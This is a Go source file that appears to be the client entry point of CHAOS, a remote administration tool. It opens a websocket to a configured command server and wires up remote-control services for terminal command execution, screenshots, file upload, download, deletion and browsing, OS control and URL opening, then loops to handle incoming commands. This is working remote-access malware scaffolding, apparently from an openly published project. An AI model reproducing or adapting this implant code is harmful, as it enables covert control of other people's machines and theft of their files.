package app

import (
	"github.com/tiagorlampert/CHAOS/client/app/gateway/client"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/infrastructure/websocket"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/services/delete"
	"github.com/tiagorlampert/CHAOS/client/app/services/download"
	"github.com/tiagorlampert/CHAOS/client/app/services/explorer"
	"github.com/tiagorlampert/CHAOS/client/app/services/information"
	"github.com/tiagorlampert/CHAOS/client/app/services/os"
	"github.com/tiagorlampert/CHAOS/client/app/services/screenshot"
	"github.com/tiagorlampert/CHAOS/client/app/services/terminal"
	"github.com/tiagorlampert/CHAOS/client/app/services/upload"
	"github.com/tiagorlampert/CHAOS/client/app/services/url"
	"github.com/tiagorlampert/CHAOS/client/app/shared/environment"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
	"log"
)

type App struct {
	Handler *handler.Handler
}

func New(configuration *environment.Configuration) *App {
	informationService := information.NewService(configuration.Server.HttpPort)

	device, err := informationService.LoadDeviceSpecs()
	if err != nil {
		log.Fatal("error loading device specs: ", err)
	}

	connection, _ := websocket.NewConnection(configuration, device.MacAddress)

	httpClient := network.NewHttpClient(10)

	operatingSystem := os.DetectOS()
	terminalService := terminal.NewTerminalService()

	clientGateway := client.NewGateway(configuration, httpClient)

	clientServices := &services.Services{
		Information: informationService,
		Terminal:    terminalService,
		Screenshot:  screenshot.NewService(),
		Download:    download.NewService(configuration, clientGateway),
		Upload:      upload.NewService(configuration, httpClient),
		Delete:      delete.NewService(),
		Explorer:    explorer.NewService(),
		OS:          os.NewService(configuration, terminalService, operatingSystem),
		URL:         url.NewURLService(terminalService, operatingSystem),
	}

	return &App{handler.NewHandler(
		connection, configuration, clientGateway, clientServices, device.MacAddress)}
}

func (a *App) Run() {
	go a.Handler.KeepConnection()
	a.Handler.HandleCommand()
}
